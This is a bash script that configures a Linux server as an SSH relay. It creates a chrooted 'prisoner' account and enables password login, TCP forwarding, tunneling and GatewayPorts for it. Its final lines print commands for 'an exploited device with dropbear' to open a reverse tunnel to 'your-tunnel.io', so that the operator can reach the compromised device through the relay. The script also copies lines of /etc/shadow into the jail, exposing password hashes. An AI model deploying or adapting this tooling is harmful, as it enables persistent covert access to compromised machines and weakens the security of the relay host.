#!/usr/bin/env bash
if [ "$(echo $EUID)" -ne "0" ]; then
      echo "Run it as root"
      exit 1
fi
files_to_check="/etc/passwd /etc/group /etc/shadow /etc/ssh/sshd_config"
for c in $files_to_check; do
    grep "prisoner" $c > /dev/null
    result="$?"
    if [ "$result" -eq 0 ]; then
        echo "A user named prisoner (or some trace of one) already exists on the system"
        echo "Offending file: $c"
        exit 1
    fi
done
if [ -d "/jail" ]; then 
    echo "There is already a directory at /jail - "
    echo "did you already run this script?"
    exit 1
else
    echo "Creating /jail chroot"
    mkdir -p /jail
fi
echo "Creating /jail/bin"
mkdir -p /jail/bin
echo "Copying bash to /jail/bin"
cp $(which bash) /jail/bin/bash
echo "Checking required libraries for bash"
if  command -v ldd &>/dev/null; then
    libraries="$(ldd $(which bash) | grep -oE "[r-u,\/]{0,}/lib[0-9]{0,}/[a-z,0-9,-\.]{3,}" | sed ':a;N;$!ba;s/\n/ /g')"
    for l in $libraries; do
        if [ ! -d "/jail$(dirname $l)" ]; then
            echo "Creating directory /jail$(dirname $l)"
            mkdir -p /jail$(dirname $l)
        fi
        echo "Copying library $l to /jail$(dirname $l)/$(basename $l)"
        cp $l /jail$(dirname $l)/$(basename $l)
    done
else
    echo "Install ldd to identify required libraries"
    exit 1
fi
echo "Setting up minimal login environment"
mkdir -p /jail/etc 
mkdir -p /jail/usr
mkdir -p /jail/usr/share
cp -r /usr/share/terminfo /jail/usr/share/
mkdir /jail/dev
mknod /jail/dev/null c 1 3
mknod /jail/dev/zero c 1 5
mknod /jail/dev/tty c 5 0
mknod /jail/dev/random c 1 8
mknod /jail/dev/urandom c 1 9
chmod 0666 /jail/dev/null
chmod 0666 /jail/dev/tty
chmod 0666 /jail/dev/zero
chown root:tty /jail/dev/tty
echo "Adding user prisoner and configuring SSH chroot login"
useradd --base-dir /jail/home --create-home --shell /bin/bash prisoner
exit_useradd="$?"
if [ "$exit_useradd" == 1 ]; then
    echo "Useradd failed"
    exit $exit_useradd
fi
etcs="group passwd hosts"
for e in $etcs; do
    cp /etc/$e /jail/etc/$e
done
echo "Match User prisoner" >> /etc/ssh/sshd_config
echo "    ChrootDirectory /jail" >> /etc/ssh/sshd_config
echo "Allowing both password and pubkey authentication for prisoner"
echo "    PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo "    PubKeyAuthentication yes" >> /etc/ssh/sshd_config
echo  "Enabling TCP Forwarding, Tunneling, and GatewayPorts..."
echo "    AllowTcpForwarding yes" >> /etc/ssh/sshd_config
echo "    PermitTunnel yes" >> /etc/ssh/sshd_config
echo "    GatewayPorts yes" >> /etc/ssh/sshd_config
if [ ! -d "/jail/home/prisoner" ]; then
    mkdir -p /jail/home/prisoner
    chown prisoner:prisoner /jail/home/prisoner
fi
mkdir /jail/home/prisoner/.ssh
touch /jail/home/prisoner/.ssh/authorized_keys
cat $(ls $HOME/.ssh/*.pub) > /jail/home/prisoner/.ssh/authorized_keys
authorized="$?"
if [ "$authorized" == 1 ]; then
    echo "Warning: no public keys found in $HOME/.ssh to add to authorized login keys for prisoner"
else
    echo "Authorized pubkeys from $HOME/.ssh for login"
fi
chmod 600 /jail/home/prisoner/.ssh/authorized_keys
chown prisoner:prisoner /jail/home/prisoner/.ssh
chown prisoner:prisoner /jail/home/prisoner/.ssh/authorized_keys
yn=0
while [ $yn -lt 1 ]; do
       read -p "Set a password for prisoner? (y or n)" yorn
       case $yorn in
       y)      echo "Setting password for prisoner"
               passwd prisoner
               tail /etc/shadow > /jail/etc/shadow
               yn=1
               break;;
       n)      echo "Continuing..."
               yn=1
               break;;
       ?)      echo "invalid response!"
               ;;
       esac
   done
echo "Restarting sshd service"
killall sshd && /usr/sbin/sshd
echo "Now you can forward ports to your device via SSH"
echo "Example: on an exploited device with dropbear, run:"
echo 'dropbear -r /etc/dropbear/dropbear_ed25519_host_key -R -a -p 44224 -P /var/run/dropbear1.pid -i -K 299 -I 0'
echo 'ssh prisoner@your-tunnel.io -p 19767 -T -N -f -y -y -i /etc/dropbear/id_dropbear -A -g -K 250 -I 0 -R 44224:localhost:44224'
echo "Then, on your device, run:"
echo 'ssh remote_user@localhost -p 44224'
